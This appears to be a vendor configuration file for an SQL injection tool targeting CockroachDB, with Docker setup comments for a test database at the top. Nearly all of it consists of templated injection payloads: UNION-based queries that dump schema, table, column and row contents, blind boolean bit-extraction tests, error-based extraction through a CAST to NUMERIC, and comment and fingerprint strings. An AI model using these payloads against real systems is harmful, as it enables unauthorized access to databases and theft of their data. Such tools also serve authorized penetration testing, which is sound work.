vendor: CockroachDB
# docker pull cockroachdb/cockroach:beta-20170406
# docker network create -d bridge roachnet
# docker run -d ^
#  --name=roach1 ^
#  --hostname=roach1 ^
#  --net=roachnet ^
#  -p 26257:26257 -p 8080:8080  ^
#  cockroachdb/cockroach start --insecure
 
resource:
 info: |
  concat_ws(
      '${enclose_value_sql}',
      version(),
      current_database(),
      '-'
  )
  || '${trail_sql}'

 schema:
  database: |
   select
       concat_agg(
           '${enclose_value_sql}'
           || r
           || '${separator_qte_sql}'
           || q::text
           || '${enclose_value_sql}'
           || '${separator_cell_sql}'
       )
       || '${trail_sql}'
   from (
       select
           tables.table_schema r,
           count(table_name) q
       from information_schema.tables
       group by 1
       order by 1
       ${limit}
   ) x

  table: |
   select
       concat_agg(
           '${enclose_value_sql}'
           || r
           || '${separator_qte_sql}'
           || q::text
           || '${enclose_value_sql}'
           || '${separator_cell_sql}'
       )
       || '${trail_sql}'
   from (
       select
           tables.table_name r,
           '0' q
       from information_schema.tables
       where tables.TABLE_SCHEMA = '${database}'
       order by 1
       ${limit}
   ) x

  column: |
   select
       concat_agg(
           '${enclose_value_sql}'
           || r
           || '${separator_qte_sql}'
           || q::text
           || '${enclose_value_sql}'
           || '${separator_cell_sql}'
       )
       || '${trail_sql}'
   from (
       select
           columns.column_name r,
           '0' q
       from information_schema.columns
       where columns.TABLE_SCHEMA = '${database}'
       and columns.TABLE_name = '${table}'
       order by 1
       ${limit}
   )x

  row:
   query: |
    select
        concat_agg(
            '${enclose_value_sql}'
            || r
            || '${separator_qte_sql}'
            || q::text
            || '${enclose_value_sql}'
            || '${separator_cell_sql}'
        )
        || '${trail_sql}'
    from (
        select
            substr((${fields}), 1, 775) r,
            count(*) q
        from ${database}.${table}
        group by 1
        ${limit}
    )x
   fields:
    field: trim(coalesce(${field.value}::text, ''))
    concat: "|| '%7f' ||"

strategy:
 configuration:
  slidingWindow: |
   select
       /**
        * If reach end of string (${lead}i) then NULLIF nullifies the result
        */
       '${lead}'
       || nullif(
           substr(
               (${injection}),
               ${window.char},
               65536
           ),
           '${trail_sql}'
       )
  limit: limit 65536 offset ${limit.value}
  failsafe: (1337${indice}7330%2b1)::text
  calibrator: repeat('%23', 1024)
  limitBoundary: 0
  endingComment: --+-
  fingerprint:
   errorMessage:
    - cockroachdb

 normal:
  indices: union select ${indices}
  capacity: (select '${lead}${indice}' || ${calibrator})
  orderBy: order by 1337

 boolean:
  test:
   bit: |
    /**
     * true bit return bit, false bit return 0
     * 8 & 8 = 8, 8 & 4 = 0
     */
    0 != (
        ascii(
            substr(
                (${injection}),
                ${window.char},
                1
            )
        )
        %26 ${bit}
    )
   length: length((${injection})) > ${window.char}
  modeAnd: and
  modeOr: or
  blind: ${boolean.mode} ${test}

 error:
  method:
   - name: CAST::text_numeric
     query: |
      /* Require FALSE statement, then OR */
      and 1 = 0
      or 1 = CAST(
          (${window})::text
          AS NUMERIC
      )
     capacity: 255